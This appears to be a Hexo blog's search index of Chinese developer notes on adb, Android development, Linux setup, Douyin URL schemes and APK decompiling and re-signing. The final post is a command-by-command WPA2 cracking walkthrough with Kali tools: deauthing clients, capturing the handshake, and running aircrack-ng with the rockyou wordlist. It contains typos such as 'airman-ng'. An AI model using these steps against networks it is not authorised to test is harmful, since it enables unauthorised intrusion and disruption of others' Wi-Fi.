        <content type="html"><![CDATA[<h2 id="查看所有表命令"><a href="#查看所有表命令" class="headerlink" title="查看所有表命令"></a>查看所有表命令</h2><p>.table</p><h2 id="查看某个表结构"><a href="#查看某个表结构" class="headerlink" title="查看某个表结构"></a>查看某个表结构</h2><p>.schema tableName</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>AndroidStudio使用</title>
      <link href="/2020/08/04/AndroidStudio%E4%BD%BF%E7%94%A8/"/>
      <url>/2020/08/04/AndroidStudio%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h3 id="gradle-版本，在-gradle-上可查看"><a href="#gradle-版本，在-gradle-上可查看" class="headerlink" title="gradle 版本，在 ~/.gradle 上可查看"></a>gradle 版本，在 ~/.gradle 上可查看</h3>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>抖音探讨</title>
      <link href="/2020/07/18/%E6%8A%96%E9%9F%B3%E6%8E%A2%E8%AE%A8/"/>
      <url>/2020/07/18/%E6%8A%96%E9%9F%B3%E6%8E%A2%E8%AE%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="scheme"><a href="#scheme" class="headerlink" title="scheme"></a>scheme</h2><ul><li><p>打开个人主页，先在个人主页分享出链接，然后用浏览器打开，就能看到。比如<br><a href="https://v.douyin.com/JYRY2V6/" target="_blank" rel="noopener">https://v.douyin.com/JYRY2V6/</a><br>用浏览器打开是：<a href="https://www.iesdouyin.com/share/user/110929513923?u_code=19d7jlbfb&amp;sec_uid=MS4wLjABAAAA5DhDrgqM_cKIhGoDjQnqiUD8LpLeHJ3MHE1ksQC_YhM&amp;timestamp=1595003518&amp;utm_source=copy&amp;utm_campaign=client_share&amp;utm_medium=android&amp;share_app_name=douyin" target="_blank" rel="noopener">https://www.iesdouyin.com/share/user/110929513923?u_code=19d7jlbfb&amp;sec_uid=MS4wLjABAAAA5DhDrgqM_cKIhGoDjQnqiUD8LpLeHJ3MHE1ksQC_YhM&amp;timestamp=1595003518&amp;utm_source=copy&amp;utm_campaign=client_share&amp;utm_medium=android&amp;share_app_name=douyin</a><br>“am start -a android.intent.action.VIEW -d snssdk1128://user/profile/110929513923”</p></li><li><p>打开作品，把作品的分享链接用浏览器打开，就能看到。<br>比如 <a href="https://v.douyin.com/JYdM9Wg/" target="_blank" rel="noopener">https://v.douyin.com/JYdM9Wg/</a><br>用浏览器打开是：<a href="https://www.iesdouyin.com/share/video/6843738111751539976/?region=CN&amp;mid=6843738121620785934&amp;u_code=19d7jlbfb&amp;titleType=title&amp;utm_source=copy_link&amp;utm_campaign=client_share&amp;utm_medium=android&amp;app=aweme" target="_blank" rel="noopener">https://www.iesdouyin.com/share/video/6843738111751539976/?region=CN&amp;mid=6843738121620785934&amp;u_code=19d7jlbfb&amp;titleType=title&amp;utm_source=copy_link&amp;utm_campaign=client_share&amp;utm_medium=android&amp;app=aweme</a><br>“am start -a android.intent.action.VIEW -d snssdk1128://aweme/detail/6843738111751539976”</p></li><li><p>进入直播，room_id取值跟上面两种方式一样<br>“am start -a android.intent.action.VIEW -d snssdk1128://live?room_id=6850773103255882510”</p></li></ul><p>// 抖音火山<br>snssdk1128://user/profile/69587851093</p><p>// 抖音极速版<br>snssdk2329</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>一些开发问题</title>
      <link href="/2020/07/09/%E4%B8%80%E4%BA%9B%E5%BC%80%E5%8F%91%E9%97%AE%E9%A2%98/"/>
      <url>/2020/07/09/%E4%B8%80%E4%BA%9B%E5%BC%80%E5%8F%91%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h2 id="使用淘宝镜像安装可以这么用"><a href="#使用淘宝镜像安装可以这么用" class="headerlink" title="使用淘宝镜像安装可以这么用"></a>使用淘宝镜像安装可以这么用</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install --registry=https://registry.npm.taobao.org</span><br></pre></td></tr></table></figure><h3 id="数据线连接到mac时，不断重复连接断开，执行以下命令"><a href="#数据线连接到mac时，不断重复连接断开，执行以下命令" class="headerlink" title="数据线连接到mac时，不断重复连接断开，执行以下命令"></a>数据线连接到mac时，不断重复连接断开，执行以下命令</h3><p>sudo killall -STOP -c usbd </p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Linux记录</title>
      <link href="/2020/06/24/Linux%E8%AE%B0%E5%BD%95/"/>
      <url>/2020/06/24/Linux%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h3 id="安装pm2遇到的问题及解决"><a href="#安装pm2遇到的问题及解决" class="headerlink" title="安装pm2遇到的问题及解决"></a>安装pm2遇到的问题及解决</h3><h4 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h4><pre><code>* 安装命令：npm install pm2 -g<figure class="highlight plain"><figcaption><span>-></span><a href="/usr/local/nodejs/lib/node_modules/pm2/bin/pm2">link</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;usr&#x2F;local&#x2F;nodejs&#x2F;bin&#x2F;pm2-dev -&gt; &#x2F;usr&#x2F;local&#x2F;nodejs&#x2F;lib&#x2F;node_modules&#x2F;pm2&#x2F;bin&#x2F;pm2-dev</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;nodejs&#x2F;bin&#x2F;pm2-docker -&gt; &#x2F;usr&#x2F;local&#x2F;nodejs&#x2F;lib&#x2F;node_modules&#x2F;pm2&#x2F;bin&#x2F;pm2-docker</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;nodejs&#x2F;bin&#x2F;pm2-runtime -&gt; &#x2F;usr&#x2F;local&#x2F;nodejs&#x2F;lib&#x2F;node_modules&#x2F;pm2&#x2F;bin&#x2F;pm2-runtime</span><br><span class="line">npm WARN optional SKIPPING OPTIONAL DEPENDENCY: fsevents@~2.1.2 (node_modules&#x2F;pm2&#x2F;node_modules&#x2F;chokidar&#x2F;node_modules&#x2F;fsevents):</span><br><span class="line">npm WARN notsup SKIPPING OPTIONAL DEPENDENCY: Unsupported platform for fsevents@2.1.3: wanted &#123;&quot;os&quot;:&quot;darwin&quot;,&quot;arch&quot;:&quot;any&quot;&#125; (current: &#123;&quot;os&quot;:&quot;linux&quot;,&quot;arch&quot;:&quot;x64&quot;&#125;)</span><br><span class="line">npm WARN ws@7.2.5 requires a peer of bufferutil@^4.0.1 but none is installed. You must install peer dependencies yourself.</span><br><span class="line">npm WARN ws@7.2.5 requires a peer of utf-8-validate@^5.0.2 but none is installed. You must install peer dependencies yourself.</span><br></pre></td></tr></table></figure></code></pre><h4 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h4><pre><code>vi /etc/profile # 在PATH后，添加路径 /usr/local/nodejs/binsource /etc/profile # 让刚才的修改生效</code></pre><h4 id="修改远程端口为2202"><a href="#修改远程端口为2202" class="headerlink" title="修改远程端口为2202"></a>修改远程端口为2202</h4><p><code>$ vi /etc/ssh/sshd_config</code><br>    将Port 22，改为 Port 2202</p><pre><code>防火墙允许此端口对外开放firewall-cmd --zone=public --add-port=2202/tcp --permanentfirewall-cmd --reload   // 重启防火墙，让设置生效重启ssh服务systemctl restart sshd.service</code></pre><h4 id="git-443-No-route-to-host"><a href="#git-443-No-route-to-host" class="headerlink" title="git 443 No route to host"></a>git 443 No route to host</h4><p>vi /etc/hosts/ 加地址 如 xx.xx.xx.xx github.com</p><h4 id="gitee-443-No-route-to-host"><a href="#gitee-443-No-route-to-host" class="headerlink" title="gitee 443 No route to host"></a>gitee 443 No route to host</h4><p>vi /etc/hosts/ 加地址 如 xx.xx.xx.xx gitee.com</p><h4 id="查看端口号运行情况"><a href="#查看端口号运行情况" class="headerlink" title="查看端口号运行情况"></a>查看端口号运行情况</h4><p>lsof -i:端口号</p><h4 id="添加计划任务"><a href="#添加计划任务" class="headerlink" title="添加计划任务"></a>添加计划任务</h4><p>crontab -e<br>30 1 * * * /home/crontab/mongod_bak.sh #表示每天凌晨1点30执行备份</p><p>/sbin/service crond reload #重新载入配置<br>chkconfig –level 35 crond on  #加入开机自动启动:<br>/sbin/service crond start   #启动服务<br>crontab -l #列出crontab文件</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>autojs研究</title>
      <link href="/2020/06/09/autojs%E7%A0%94%E7%A9%B6/"/>
      <url>/2020/06/09/autojs%E7%A0%94%E7%A9%B6/</url>
      
        <content type="html"><![CDATA[<h3 id="脚本切入口"><a href="#脚本切入口" class="headerlink" title="脚本切入口"></a>脚本切入口</h3><pre><code>/Users/chenk/Documents/code/github_code/AA-my-project/ck-Auto/autojs/src/main/java/com/stardust/autojs/engine/RhinoJavaScriptEngine.kt</code></pre><p>// 点击事件所在文件<br>SimpleActionAutomator</p><p>获取当前软件包等<br>AppUtils</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>安卓开发一</title>
      <link href="/2020/05/05/%E5%AE%89%E5%8D%93%E5%BC%80%E5%8F%91%E4%B8%80/"/>
      <url>/2020/05/05/%E5%AE%89%E5%8D%93%E5%BC%80%E5%8F%91%E4%B8%80/</url>
      
        <content type="html"><![CDATA[<p>学习路线<br>ViewModel, ViewBinding, Lifecycle, LiveData, Room，Navigation<br>OkHttp, Retrofit, RxJava, Dagger2<br>Kotlin 和 Kotlin 协程</p><ul><li><p>ViewModel 屏幕横向、竖向变化时，Activity 的 onCreate会执行，数据会重新加载，用ViewModel可以使数据的状态不受横竖屏的影响，原因是其存在时间范围是：对于 activity，是在 activity 完成时；而对于 fragment，是在 fragment 分离时。</p></li><li><p>ViewBinding MainActivity.java –&gt; activity_main.xml –&gt; ActivityMainBinding<br>需要在 Module build.gradle 里添加如下代码<br>android {<br>…<br>viewBinding {<br>  enabled true<br>}<br>…<br>}</p></li><li><p>LiveData 在底层数据库更改时通知视图,observe 观察者</p></li><li><p>Activity 生命周期<br>第一次打开 onCreate -&gt; onStart -&gt; onResume<br>退出 onPause -&gt; onStop<br>屏幕翻转 onPause -&gt; onStop -&gt; onDestroy -&gt; onCreate -&gt; onStart -&gt; onResume</p></li><li><p>Fragment 生命周期<br>onAttach(Activity的绑定) -&gt; onCreate -&gt; onCreateView -&gt; onActivityCreated -&gt; onStart</p></li></ul><p>-&gt; onResume -&gt; onPause -&gt; onStop -&gt; onDestroyView -&gt; onDestroy -&gt; onDetach(解绑)</p><ul><li>Room</li></ul><p>文档<br><a href="https://developer.android.google.cn/jetpack/androidx/releases/room" target="_blank" rel="noopener">https://developer.android.google.cn/jetpack/androidx/releases/room</a></p><p>Entity<br>Dao(Database access object)<br>Database</p><h3 id="四大组件"><a href="#四大组件" class="headerlink" title="四大组件"></a>四大组件</h3><h4 id="Android-活动组件"><a href="#Android-活动组件" class="headerlink" title="Android 活动组件"></a>Android 活动组件</h4><h4 id="Android-服务组件"><a href="#Android-服务组件" class="headerlink" title="Android 服务组件"></a>Android 服务组件</h4><h4 id="Android-广播组件"><a href="#Android-广播组件" class="headerlink" title="Android 广播组件"></a>Android 广播组件</h4><h4 id="Android-内容提供者组件"><a href="#Android-内容提供者组件" class="headerlink" title="Android 内容提供者组件"></a>Android 内容提供者组件</h4><h4 id="尺寸单位"><a href="#尺寸单位" class="headerlink" title="尺寸单位"></a>尺寸单位</h4><ul><li>dp 主要用来设置边距、组件大小</li><li>sp 可伸缩像素，主要用来设置字体大小</li></ul><h4 id="资源"><a href="#资源" class="headerlink" title="资源"></a>资源</h4><ul><li>drawable 放资源文件、9patch等</li><li>mipmap 放应用程序启动图标</li></ul><h4 id="外部存储和内部存储区别"><a href="#外部存储和内部存储区别" class="headerlink" title="外部存储和内部存储区别"></a>外部存储和内部存储区别</h4><ul><li>外部存储，手机连接电脑是，能在电脑上看到的文件，就是外部存储</li></ul><h4 id="读写外部存储文件"><a href="#读写外部存储文件" class="headerlink" title="读写外部存储文件"></a>读写外部存储文件</h4><ul><li>读 FileInputStream</li><li>写 FileOutputStream</li></ul><h4 id="URI-和-URL-的区别"><a href="#URI-和-URL-的区别" class="headerlink" title="URI 和 URL 的区别"></a>URI 和 URL 的区别</h4><ul><li>URI 统一资源标识符，不局限于客户端和服务器</li><li>URL 统一资源定位符，能定义网站上的一切资源</li></ul><h4 id="线程"><a href="#线程" class="headerlink" title="线程"></a>线程</h4><ul><li>子线程不允许操作主线程中的组件，用Handler</li></ul><h4 id="笔记"><a href="#笔记" class="headerlink" title="笔记"></a>笔记</h4><ul><li><p>TabLayout<br>tabIconTint 设置文字上面图标的颜色</p></li><li><p>新建的项目 MainActivity 会出现红色曲线，在该项目的 build.gradle 下放一行<br>implementation ‘androidx.lifecycle:lifecycle-extensions:2.2.0’</p></li><li><p>dx 所在路径 ~/Library/Android/sdk/build-tools/29.0.3<br>dx 可以将jar/class文件转换为dex文件，命令如下<br>dx –dex –output xxx.dex xxx.jar<br>或 dx –dex –output xxx.dex xxx.class</p></li></ul><h4 id="android-studio"><a href="#android-studio" class="headerlink" title="android studio"></a>android studio</h4><ul><li>打包参数设置 Build Variants –&gt; Active Build Variant</li></ul><h4 id="Intent-意图"><a href="#Intent-意图" class="headerlink" title="Intent 意图"></a>Intent 意图</h4><h5 id="Intent"><a href="#Intent" class="headerlink" title="Intent"></a>Intent</h5><ul><li>有5个属性，category 、action 和 data、extra、flags<h5 id="隐式-Intent"><a href="#隐式-Intent" class="headerlink" title="隐式 Intent"></a>隐式 Intent</h5></li><li>参与匹配的有三个属性 category 、action 和 data</li></ul><h4 id="ViewPager2"><a href="#ViewPager2" class="headerlink" title="ViewPager2"></a>ViewPager2</h4><ul><li>自带懒加载</li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Mac-反编译apk工具的使用</title>
      <link href="/2020/05/01/Mac-%E5%8F%8D%E7%BC%96%E8%AF%91apk%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
      <url>/2020/05/01/Mac-%E5%8F%8D%E7%BC%96%E8%AF%91apk%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="安卓反编译三大利器-apktool、dex2jar、JD-GUI"><a href="#安卓反编译三大利器-apktool、dex2jar、JD-GUI" class="headerlink" title="安卓反编译三大利器 apktool、dex2jar、JD-GUI"></a>安卓反编译三大利器 apktool、dex2jar、JD-GUI</h2><h3 id="apktool"><a href="#apktool" class="headerlink" title="apktool"></a>apktool</h3><ul><li>Google 提供的 APK 编译工具，能够反编译和编译APK</li></ul><h3 id="dex2jar"><a href="#dex2jar" class="headerlink" title="dex2jar"></a>dex2jar</h3><ul><li>专门用来反编译.dex文件，可以把.dex文件反编译为.jar文件</li><li>最新版本在 <a href="https://github.com/pxb1988/dex2jar.git" target="_blank" rel="noopener">github</a>，编译命令 ./gradlew build，生成的可执行文件在 根目录/dex-tools/build/distributions/dex-tools-2.1-SNAPSHOT.zip</li><li>执行命令 目录/d2j-dex2jar class.dex</li></ul><h3 id="JD-GUI"><a href="#JD-GUI" class="headerlink" title="JD-GUI"></a>JD-GUI</h3><ul><li>将.jar文件，反编译为.java文件</li></ul><h2 id="apktool-使用"><a href="#apktool-使用" class="headerlink" title="apktool 使用"></a>apktool 使用</h2><ul><li>apktool d xx.apk  不能得到classes.dex文件，但有smali文件夹,smali里面存放的就是java文件，不过已经被转换为smali语言</li><li>apktool d -s xx.apk 能得到 classes.dex 一般用这种方式来反编译apk</li><li>apktool b -o output.apk dir 打包，只能打包通过apktool 反编译出来的文件夹</li></ul><h2 id="签名"><a href="#签名" class="headerlink" title="签名"></a>签名</h2><ul><li><p>生成keystore文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keytool -genkey -alias demo.keystore -keyalg RSA -validity 40000 -keystore demo.keystore</span><br></pre></td></tr></table></figure><p>-genkey 产生证书文件</p><p>-alias 产生别名</p><p>-keystore 指定密钥库的keystore文件</p><p>-keyalg 指定密钥算法</p><p>-validity 证书有效天数</p></li><li><p>签名</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jarsigner -verbose -keystore demo.keystore demo.apk demo.keystore</span><br></pre></td></tr></table></figure><p>-verbose 指定生成详细输出<br>-keystore 指定数字证书存储路径</p><p>最后面的demo.keystore 是指生成keystore文件时，-alias 带的别名，如果生成keystore时没有带-alias，则签名的时候，最后一个demo.keystore 应该为 mykey，即</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jarsigner -verbose -keystore demo.keystore demo.apk mykey</span><br></pre></td></tr></table></figure><p><img src="xx/image-20200504200327918.png" alt="image-20200504200327918"></p></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>adb一些命令</title>
      <link href="/2020/04/30/adb%E4%B8%80%E4%BA%9B%E5%91%BD%E4%BB%A4/"/>
      <url>/2020/04/30/adb%E4%B8%80%E4%BA%9B%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<h3 id="adb-调试-安卓设备"><a href="#adb-调试-安卓设备" class="headerlink" title="adb 调试 安卓设备"></a>adb 调试 安卓设备</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$ adb devices   // 查看设备列表</span><br><span class="line">$ adb -s xxx cmd    // 选择一个设备并执行相应命令，如 adb -s FA72K0123456 shell</span><br><span class="line">$ adb push pcPath AndroidPath   // 上传文件到安卓设备</span><br><span class="line">$ adb pull AndroidPath pcPath   // 拉安卓设备的文件到电脑</span><br><span class="line">$ adb install softwarePath      // 安装软件到安卓设备</span><br><span class="line">$ adb shell screencap -p sdcard/1.png   // 截图</span><br><span class="line">$ adb shell am broadcast -a android.intent.action.AIRPLANE_MODE --ez state <span class="literal">true</span>     // 打开飞行模式 需要root权限</span><br><span class="line">$ adb shell am broadcast -a android.intent.action.AIRPLANE_MODE --ez state <span class="literal">false</span>    // 关闭飞行模式 需</span><br><span class="line">要root权限</span><br><span class="line"></span><br><span class="line">// 发送广播 启动完成</span><br><span class="line">$ adb shell am broadcast -a android.intent.action.BOOT_COMPLETED</span><br><span class="line"></span><br><span class="line">$ busybox vi xx     // 远程编辑文件</span><br><span class="line"></span><br><span class="line">// 进入fastboot</span><br></pre></td></tr></table></figure><p>$ adb reboot bootloader</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 查看当前activity</span><br></pre></td></tr></table></figure><p>$ adb shell dumpsys activity top</p><ul><li><p>查看各类服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ adb shell service list</span><br></pre></td></tr></table></figure></li><li><p>查看某个包当前的Activity情况</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ adb shell dumpsys activity com.tencent.mm</span><br></pre></td></tr></table></figure></li><li><p>找出状态栏通知的包名</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ adb shell dumpsys statusbar | grep notification=Notification</span><br></pre></td></tr></table></figure></li><li><p>查看当前窗口的Activity</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell dumpsys window | findstr mCurrentFocus</span><br></pre></td></tr></table></figure></li><li><p>查看包路径</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ adb shell pm path packageName</span><br></pre></td></tr></table></figure></li><li><p>列出匹配名字的包的路径</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ adb shell pm list packages -f -3 | cut -d &quot;&#x3D;&quot; -f1 | grep xxx</span><br></pre></td></tr></table></figure></li><li><p>列出所有包</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ adb shell pm list packages</span><br></pre></td></tr></table></figure></li><li><p>启动远程端口号(需要先连接数据线)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ adb tcpip 5555</span><br></pre></td></tr></table></figure></li><li><p>端口远程设备<br>adb disconnect ip:port</p></li><li><p>端口转发<br>adb forward tcp:30333 tcp:30333</p></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Kali Linux 渗透 Wifi 初探</title>
      <link href="/2020/04/17/Kail-Linux-%E6%B8%97%E9%80%8F-Wifi-%E5%88%9D%E6%8E%A2/"/>
      <url>/2020/04/17/Kail-Linux-%E6%B8%97%E9%80%8F-Wifi-%E5%88%9D%E6%8E%A2/</url>
      
        <content type="html"><![CDATA[<h3 id="先将无线网卡插入Kali-Linux，输入iwconfig命令查看得到，网卡名为wlan0"><a href="#先将无线网卡插入Kali-Linux，输入iwconfig命令查看得到，网卡名为wlan0" class="headerlink" title="先将无线网卡插入Kali Linux，输入iwconfig命令查看得到，网卡名为wlan0"></a>先将无线网卡插入Kali Linux，输入iwconfig命令查看得到，网卡名为wlan0</h3><h3 id="排除影响进行无线实验的因素"><a href="#排除影响进行无线实验的因素" class="headerlink" title="排除影响进行无线实验的因素"></a>排除影响进行无线实验的因素</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ service network-manager stop</span><br><span class="line">$ airmon-ng check <span class="built_in">kill</span></span><br></pre></td></tr></table></figure><h3 id="启动monitor模式"><a href="#启动monitor模式" class="headerlink" title="启动monitor模式"></a>启动monitor模式</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ airman-ng start wlan0</span><br></pre></td></tr></table></figure><h3 id="抓包（扫描wifi）"><a href="#抓包（扫描wifi）" class="headerlink" title="抓包（扫描wifi）"></a>抓包（扫描wifi）</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ airodump-ng wlan0mon</span><br></pre></td></tr></table></figure><h3 id="针对要破解的WiFi重新开启监听记录"><a href="#针对要破解的WiFi重新开启监听记录" class="headerlink" title="针对要破解的WiFi重新开启监听记录"></a>针对要破解的WiFi重新开启监听记录</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ airodump-ng -w 文件名 --bssid [路由器的MAC地址] -c [监听频道CH] wlan0mon</span><br></pre></td></tr></table></figure><h3 id="打开另一个shell窗口运行-强制断开连接到路由器的设备，以便在它再次连接时捕获它的认证包"><a href="#打开另一个shell窗口运行-强制断开连接到路由器的设备，以便在它再次连接时捕获它的认证包" class="headerlink" title="打开另一个shell窗口运行(强制断开连接到路由器的设备，以便在它再次连接时捕获它的认证包)"></a>打开另一个shell窗口运行(强制断开连接到路由器的设备，以便在它再次连接时捕获它的认证包)</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ aireplay-ng -0 1 -a [路由器的MAC地址] -c [客户端的MAC地址] wlan0mon</span><br></pre></td></tr></table></figure><h3 id="跑包测试加密的无线密码"><a href="#跑包测试加密的无线密码" class="headerlink" title="跑包测试加密的无线密码"></a>跑包测试加密的无线密码</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ aircrack-ng -w [准备好的密码字典] [捕获到的数据包 .<span class="built_in">cap</span>后缀的]</span><br></pre></td></tr></table></figure><h3 id="Kali中几个常用的字典文件的位置："><a href="#Kali中几个常用的字典文件的位置：" class="headerlink" title="Kali中几个常用的字典文件的位置："></a>Kali中几个常用的字典文件的位置：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/john/password.lst</span><br><span class="line">/usr/share/wfuzz/wordlist</span><br><span class="line">/usr/share/wordlists</span><br><span class="line">/usr/share/wordlists/rockyou.txt.gz</span><br></pre></td></tr></table></figure><h3 id="破解例子"><a href="#破解例子" class="headerlink" title="破解例子"></a>破解例子</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ /usr/share/wordlists/ &amp;&amp; gunzip rockyou.txt.gz</span><br><span class="line">​$ aircrack-ng -w /usr/share/wordlists/rockyou.txt wpa2-01.cap</span><br></pre></td></tr></table></figure><h3 id="END-等待跑包吧。。"><a href="#END-等待跑包吧。。" class="headerlink" title="END 等待跑包吧。。"></a>END 等待跑包吧。。</h3>]]></content>
      
      
      
        <tags>
            
            <tag> 渗透 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
